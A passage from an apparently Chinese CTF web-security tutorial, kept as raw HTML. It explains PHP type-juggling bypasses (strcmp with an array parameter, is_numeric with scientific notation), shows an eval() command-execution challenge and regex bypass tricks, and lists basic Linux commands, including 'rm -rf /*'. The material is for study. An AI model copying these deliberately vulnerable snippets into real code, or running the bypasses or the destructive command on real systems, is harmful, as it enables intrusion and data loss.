class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</li><li>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</li><li>我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</li><li>payload: password[]&#x3D;xxx</li></ul><h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;4admin&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail1&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail2&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail3&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;sucess&quot;</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;failall&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理和上面一样</p><h4 id="is-numeric（）、int-强制类型转换"><a href="#is-numeric（）、int-强制类型转换" class="headerlink" title="is_numeric（）、int()强制类型转换"></a>is_numeric（）、int()强制类型转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;The time must be number.&#x27;</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;This time is too short.&#x27;</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;This time is too long.&#x27;</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]); </span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">        &#125; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><blockquote><p>int()，不能正确转换的类型有十六进制型字符串、科学计数法型字符串<br>is_numeric()支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串</p></blockquote><p>先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L&lt; time &lt; 7776000</p><p>通过is_number() 能传入科学计数法，来进行绕过。</p><p>所以根据int不能处理科学计数法，而在is_number上能处理来解决。</p><h3 id="php-eval-RCE"><a href="#php-eval-RCE" class="headerlink" title="php_eval_RCE"></a>php_eval_RCE</h3><p>eval危险函数利用好就可以完成RCE，所以一般使用的时候会ban掉很多东西,下面就是一个最简单的<code>eval()</code>的利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以通过调用一些函数达到RCE的效果，最经典的就是<code>system()</code>可以通过这个函数实现命令的执行。</p><h4 id="然后就是一些linux的基础知识"><a href="#然后就是一些linux的基础知识" class="headerlink" title="然后就是一些linux的基础知识"></a>然后就是一些linux的基础知识</h4><h5 id="Linux系统的文件结构"><a href="#Linux系统的文件结构" class="headerlink" title="Linux系统的文件结构"></a>Linux系统的文件结构</h5><blockquote><p>&#x2F;bin 二进制文件，系统常规命令<br>&#x2F;boot 系统启动分区，系统启动时读取的文件<br>&#x2F;dev 设备文件<br>&#x2F;etc 大多数配置文件<br>&#x2F;home 普通用户的家目录<br>&#x2F;lib 32位函数库<br>&#x2F;lib64 64位库<br>&#x2F;media 手动临时挂载点<br>&#x2F;mnt 手动临时挂载点<br>&#x2F;opt 第三方软件安装位置<br>&#x2F;proc 进程信息及硬件信息<br>&#x2F;root 临时设备的默认挂载点<br>&#x2F;sbin 系统管理命令<br>&#x2F;srv 数据<br>&#x2F;var 数据<br>&#x2F;sys 内核相关信息<br>&#x2F;tmp 临时文件<br>&#x2F;usr 用户相关设定</p></blockquote><h5 id="linux的命令"><a href="#linux的命令" class="headerlink" title="linux的命令"></a>linux的命令</h5><p>立刻关机</p><ul><li><code>shutdown -h now</code></li><li><code>poweroff</code></li></ul><p>两分钟后关机</p><ul><li><code>shutdown -h 2</code></li></ul><p>立刻重启</p><ul><li><code>shutdown -r now</code></li><li><code>reboot</code></li></ul><p>两分钟后重启</p><ul><li><code>shutdown -r 2</code></li></ul><p>帮助命令</p><ul><li><code>（help）ifconfig --help //查看 ifconfig 命令的用法</code></li></ul><p>命令说明书</p><ul><li><code>（man）man shutdown //打开命令说明后，可按&quot;q&quot;键退出</code></li></ul><p>切换用户（su）</p><ul><li><code>su yao //切换为用户&quot;yao&quot;,输入后回车需要输入该用户的密码</code></li><li><code>exit //退出当前用户</code></li></ul><p>切换目录（cd）</p><ul><li><code>cd / //切换到根目录</code></li><li><code>cd /bin //切换到根目录下的bin目录</code></li><li><code>cd ../ //切换到上一级目录 或者使用命令：cd ..</code></li><li><code>cd ~ //切换到home目录</code></li><li><code>cd - //切换到上次访问的目录</code></li><li><code>cd xx(文件夹名) //切换到本目录下的名为xx的文件目录，如果目录不存在报错</code></li><li><code>cd /xxx/xx/x //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</code></li></ul><p>查看目录（ls）</p><ul><li><code>ls //查看当前目录下的所有目录和文件</code></li><li><code>ls -a //查看当前目录下的所有目录和文件（包括隐藏的文件）</code></li><li><code>ls -l //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</code></li><li><code>ls /bin //查看指定目录下的所有目录和文件</code></li></ul><p>创建目录（mkdir）</p><ul><li><code>mkdir tools //在当前目录下创建一个名为tools的目录</code></li><li><code>mkdir /bin/tools //在指定目录下创建一个名为tools的目录</code></li></ul><p>删除目录与文件（rm）</p><ul><li><code>rm 文件名 //删除当前目录下的文件</code></li><li><code>rm -f 文件名 //删除当前目录的的文件（不询问）</code></li><li><code>rm -r 文件夹名 //递归删除当前目录下此名的目录</code></li><li><code>rm -rf 文件夹名 //递归删除当前目录下此名的目录（不询问）</code></li><li><code>rm -rf * //将当前目录下的所有目录和文件全部删除</code></li><li><code>rm -rf /* //将根目录下的所有文件全部删除</code></li></ul><p>修改目录（mv）</p><ul><li><code>mv 当前目录名 新目录名 //修改目录名，同样适用与文件操作</code></li><li><code>mv /usr/tmp/tool /opt //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</code></li><li><code>mv -r /usr/tmp/tool /opt //递归剪切目录中所有文件和文件夹</code></li></ul><p>拷贝目录（cp）</p><ul><li><code>cp /usr/tmp/tool /opt //将/usr/tmp目录下的tool目录复制到 /opt目录下面</code></li><li><code>cp -r /usr/tmp/tool /opt //递归剪复制目录中所有文件和文件夹</code></li></ul><p>搜索目录（find）</p><ul><li><code>find /bin -name &#39;a*&#39; //查找/bin目录下的所有以a开头的文件或者目录</code></li></ul><p>查看当前目录（pwd）</p><ul><li><code>pwd //显示当前位置路径</code></li></ul><p>新增文件（touch）</p><ul><li><code>touch a.txt //在当前目录下创建名为a的txt文件（文件不存在），如果文件存在，将文件时间属性修改为当前系统时间</code></li></ul><p>删除文件（rm）</p><ul><li><code>rm 文件名 //删除当前目录下的文件</code></li><li><code>rm -f 文件名 //删除当前目录的的文件（不询问）</code></li></ul><p>编辑文件（vi、vim）</p><ul><li><code>vi 文件名 //打开需要编辑的文件</code></li><li><code>vim +10 filename.txt //打开文件并跳到第10行</code></li><li><code>vim -R /etc/passwd //以只读模式打开文件</code></li></ul><blockquote><p>-进入后，操作界面有三种模式：命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode）<br>命令模式<br>-刚进入文件就是命令模式，通过方向键控制光标位置，<br>-使用命令”dd”删除当前整行<br>-使用命令”&#x2F;字段”进行查找<br>-按”i”在光标所在字符前开始插入<br>-按”a”在光标所在字符后开始插入<br>-按”o”在光标所在行的下面另起一新行插入<br>-按”：”进入底行模式<br>插入模式<br>-此时可以对文件内容进行编辑，左下角会显示 “– 插入 –””<br>-按”ESC”进入底行模式<br>底行模式<br>-退出编辑： :q<br>-强制退出： :q!<br>-保存并退出： :wq</p><p>操作步骤示例</p><p>1.保存文件：按”ESC” -&gt; 输入”:” -&gt; 输入”wq”,回车 &#x2F;&#x2F;保存并退出编辑<br>2.取消操作：按”ESC” -&gt; 输入”:” -&gt; 输入”q!”,回车 &#x2F;&#x2F;撤销本次修改并退出编辑</p></blockquote><p>查看文件</p><ul><li><code>cat a.txt //查看文件最后一屏内容</code></li><li><code>less a.txt //PgUp向上翻页，PgDn向下翻页，&quot;q&quot;退出查看</code></li><li><code>more a.txt //显示百分比，回车查看下一行，空格查看下一页，&quot;q&quot;退出查看</code></li><li><code>tail -100 a.txt //查看文件的后100行，&quot;Ctrl+C&quot;退出查看</code></li></ul><p>权限说明</p><blockquote><p>文件权限简介：’r’ 代表可读（4），’w’ 代表可写（2），’x’ 代表执行权限（1），括号内代表”8421法”<br>##文件权限信息示例：-rwxrw-r–<br>-第一位：’-‘就代表是文件，’d’代表是文件夹<br>-第一组三位：拥有者的权限<br>-第二组三位：拥有者所在的组，组员的权限<br>-第三组三位：代表的是其他用户的权限</p></blockquote><p>文件权限</p><ul><li><code>普通授权 chmod +x a.txt</code></li><li><code>8421法 chmod 777 a.txt //1+2+4=7，&quot;7&quot;说明授予所有权限</code></li></ul><p>打包与解压</p><blockquote><p>.zip、.rar &#x2F;&#x2F;windows系统中压缩文件的扩展名</p><p>.tar &#x2F;&#x2F;Linux中打包文件的扩展名</p><p>.gz &#x2F;&#x2F;Linux中压缩文件的扩展名</p><p>.tar.gz &#x2F;&#x2F;Linux中打包并压缩文件的扩展名</p></blockquote><p>打包文件</p><blockquote><p>tar -zcvf 打包压缩后的文件名 要打包的文件<br>参数说明：z：调用gzip压缩命令进行压缩; c：打包文件; v：显示运行过程; f：指定文件名;</p></blockquote><ul><li><code>tar -zcvf a.tar file1 file2,... //多个文件压缩打包</code></li></ul><p>解压文件</p><ul><li><code>tar -zxvf a.tar //解包至当前目录</code></li><li><code>tar -zxvf a.tar -C /usr------ //指定解压的位置</code></li><li><code>unzip test.zip //解压*.zip文件</code></li><li><code>unzip -l test.zip //查看*.zip文件的内容</code></li></ul><p>其他常用命令<br>find</p><ul><li><code>find . -name &quot;*.c&quot; //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</code></li><li><code>find . -type f //将目前目录其其下子目录中所有一般文件列出</code></li><li><code>find . -ctime -20 //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</code></li><li><code>find /var/log -type f -mtime +7 -ok rm &#123;&#125; \; //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</code></li><li><code>find . -type f -perm 644 -exec ls -l &#123;&#125; \; //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</code></li><li><code>find / -type f -size 0 -exec ls -l &#123;&#125; \; //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</code></li></ul><p>whereis</p><ul><li><code>whereis ls //将和ls文件相关的文件都查找出来</code></li></ul><p>which</p><blockquote><p>说明：which指令会在环境变量$PATH设置的目录里查找符合条件的文件。</p></blockquote><ul><li><code>which bash //查看指令&quot;bash&quot;的绝对路径</code></li></ul><p>sudo</p><blockquote><p>说明：sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。需要输入自己账户密码。<br>使用权限：在 &#x2F;etc&#x2F;sudoers 中有出现的使用者</p></blockquote><ul><li><code>sudo -l //列出目前的权限</code></li><li><code>$ sudo -u yao vi ~www/index.html //以 yao 用户身份编辑 home 目录下www目录中的 index.html 文件</code></li></ul><p>grep</p><ul><li><code>grep -i &quot;the&quot; demo_file //在文件中查找字符串(不区分大小写)</code></li><li><code>grep -A 3 -i &quot;example&quot; demo_text //输出成功匹配的行，以及该行之后的三行</code></li><li><code>grep -r &quot;ramesh&quot; * //在一个文件夹中递归查询包含指定字符串的文件</code></li></ul><p>service</p><blockquote><p>说明：service命令用于运行System V init脚本，这些脚本一般位于&#x2F;etc&#x2F;init.d文件下，这个命令可以直接运行这个文件夹里面的脚本，而不用加上路径</p></blockquote><ul><li><code>service ssh status //查看服务状态</code></li><li><code>service --status-all //查看所有服务状态</code></li><li><code>service ssh restart //重启服务</code></li></ul><p>free</p><blockquote><p>说明：这个命令用于显示系统当前内存的使用情况，包括已用内存、可用内存和交换内存的情况</p></blockquote><ul><li><code>free -g //以G为单位输出内存的使用量，-g为GB，-m为MB，-k为KB，-b为字节</code></li><li><code>free -t //查看所有内存的汇总</code></li></ul><p>top</p><ul><li><code>top //显示当前系统中占用资源最多的一些进程, shift+m 按照内存大小查看</code></li></ul><p>df</p><blockquote><p>说明：显示文件系统的磁盘使用情况</p></blockquote><ul><li><code>df -h //一种易看的显示</code></li></ul><p>mount</p><ul><li><code>mount /dev/sdb1 /u01 //挂载一个文件系统，需要先创建一个目录，然后将这个文件系统挂载到这个目录上</code></li><li><code>mount dev/sdb1 /u01 ext2 defaults 0 2 //添加到fstab中进行自动挂载，这样任何时候系统重启的时候，文件系统都会被加载</code></li></ul><p>uname</p><blockquote><p>说明：uname可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息</p></blockquote><ul><li><code>uname -a</code></li></ul><p>yum</p><blockquote><p>说明：安装插件命令</p></blockquote><ul><li><code>yum install httpd //使用yum安装apache</code></li><li><code>yum update httpd //更新apache</code></li><li><code>yum remove httpd //卸载/删除apache</code></li></ul><p>rpm</p><blockquote><p>说明：插件安装命令</p></blockquote><ul><li><code>rpm -ivh httpd-2.2.3-22.0.1.el5.i386.rpm //使用rpm文件安装apache</code></li><li><code>rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm //使用rpm更新apache</code></li><li><code>rpm -ev httpd //卸载/删除apache</code></li></ul><p>date</p><ul><li><code>date -s &quot;01/31/2010 23:59:53&quot; ///设置系统时间</code></li></ul><p>wget</p><blockquote><p>说明：使用wget从网上下载软件、音乐、视频<br>示例：wget <a target="_blank" rel="noopener" href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</a><br>&#x2F;&#x2F;下载文件并以指定的文件名保存文件</p></blockquote><ul><li><code>wget -O Lazy_fish.tar.gz http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</code></li></ul><p>ftp</p><ul><li><code>ftp IP/hostname //访问ftp服务器</code></li><li><code>mls *.html - //显示远程主机上文件列表</code></li></ul><p>scp</p><ul><li><code>scp /opt/data.txt 192.168.1.101:/opt/ //将本地opt目录下的data文件发送到192.168.1.101服务器的opt目录下</code></li></ul><p>防火墙操作</p><ul><li><code>service iptables status //查看iptables服务的状态</code></li><li><code>service iptables start //开启iptables服务</code></li><li><code>service iptables stop //停止iptables服务</code></li><li><code>service iptables restart //重启iptables服务</code></li><li><code>chkconfig iptables off //关闭iptables服务的开机自启动</code></li><li><code>chkconfig iptables on //开启iptables服务的开机自启动</code></li></ul><p>centos7 防火墙操作</p><ul><li><code>systemctl status firewalld.service //查看防火墙状态</code></li><li><code>systemctl stop firewalld.service //关闭运行的防火墙</code></li><li><code>systemctl disable firewalld.service //永久禁止防火墙服务</code></li></ul><p>修改主机名（CentOS 7）</p><ul><li><code>hostnamectl set-hostname 主机名</code></li></ul><p>查看网络</p><ul><li><code>ifconfig</code></li></ul><p>修改IP</p><p>修改网络配置文件，文件地址：&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p><p>主要修改以下配置：</p><blockquote><p>TYPE&#x3D;Ethernet &#x2F;&#x2F;网络类型</p><p>BOOTPROTO&#x3D;static &#x2F;&#x2F;静态IP</p><p>DEVICE&#x3D;ens00 &#x2F;&#x2F;网卡名</p><p>IPADDR&#x3D;192.168.1.100 &#x2F;&#x2F;设置的IP</p><p>NETMASK&#x3D;255.255.255.0 &#x2F;&#x2F;子网掩码</p><p>GATEWAY&#x3D;192.168.1.1 &#x2F;&#x2F;网关</p><p>DNS1&#x3D;192.168.1.1 &#x2F;&#x2F;DNS</p><p>DNS2&#x3D;8.8.8.8 &#x2F;&#x2F;备用DNS</p><p>ONBOOT&#x3D;yes &#x2F;&#x2F;系统启动时启动此设置</p></blockquote><p>修改保存以后使用命令重启网卡：<code>service network restart</code></p><p>配置映射<br>修改文件： <code>vi /etc/hosts</code><br>在文件最后添加映射地址，示例如下：</p><blockquote><p>192.168.1.101 node1<br>192.168.1.102 node2<br>192.168.1.103 node3</p></blockquote><p>配置好以后保存退出，输入命令：<code>ping node1</code> ，可见实际 ping 的是 192.168.1.101。</p><p>查看进程</p><ul><li><code>ps -ef //查看所有正在运行的进程</code></li></ul><p>结束进程</p><ul><li><code>kill pid //杀死该pid的进程</code></li><li><code>kill -9 pid //强制杀死该进程</code></li></ul><p>查看链接</p><ul><li><code>ping IP //查看与此IP地址的连接情况</code></li><li><code>netstat -an //查看当前系统端口</code></li><li><code>netstat -an | grep 8080 //查看指定端口</code></li></ul><p>快速清屏</p><ul><li><code>ctrl+l //清屏，往上翻可以查看历史操作</code></li></ul><p>远程主机</p><ul><li><code>ssh IP //远程主机，需要输入用户名和密码</code></li></ul><h4 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h4><p>无字母RCE虽然在现实环境中不会出现，但是在CTF中也是常见的考点，最简单的如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>我在冲浪的时候不小心找到了一个佬写的文章，他开发的一个工具，挺有用的。</p><p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/443">针对常规无字母RCE的通用辅助脚本开发</a></p><h3 id="php的一些特性"><a href="#php的一些特性" class="headerlink" title="php的一些特性"></a>php的一些特性</h3><h4 id="你喜欢preg-match吗？"><a href="#你喜欢preg-match吗？" class="headerlink" title="你喜欢preg_match吗？"></a>你喜欢preg_match吗？</h4><p>首先是大家喜闻乐见的<code>%0a</code>，什么？你也喜欢，他的原理是什么呢？</p><p>我们随便写个php测一下，<code>$</code>似乎会忽略在句尾的<code>%0a</code>，无论是换行模式还是不换行？</p><p>测了一下，这似乎是个错误的理解（）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;1&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/m&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;2&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/s&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;3&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/1.png" title="wuhu"><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/2.png" title="wuhu"><p>我们可以看到，<code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，也就是说有<code>m</code>必须要有<code>^</code>或者<code>$</code>，否则无意义。</p><p>还有一个东西，也是<code>%0a</code>所导致的一个小问题,那就是非<code>s</code>模式下<code>.</code>不匹配<code>%0a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag./&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;1&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag.$/m&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;2&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag./s&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;3&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/3.png" title="wuhu"><p>众所周知，preg_match()函数是可以绕过的，详细参考p神<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>正好测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$code</span>=<span class="string">&quot;hello&quot;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>,<span class="number">1000000</span>).<span class="string">&quot;hello_CTF&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?CTF/is&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;o.0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;hello_CTF&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;0.o&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/4.png" title="wuhu"><h4 id="讨厌的intval"><a href="#讨厌的intval" class="headerlink" title="讨厌的intval"></a>讨厌的intval</h4><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/5.png" title="wuhu"><h4 id="date函数的解析"><a href="#date函数的解析" class="headerlink" title="date函数的解析"></a>date函数的解析</h4><p>在date函数中转义字符<br>date函数完整声明如下：<br><code>date(string format,int 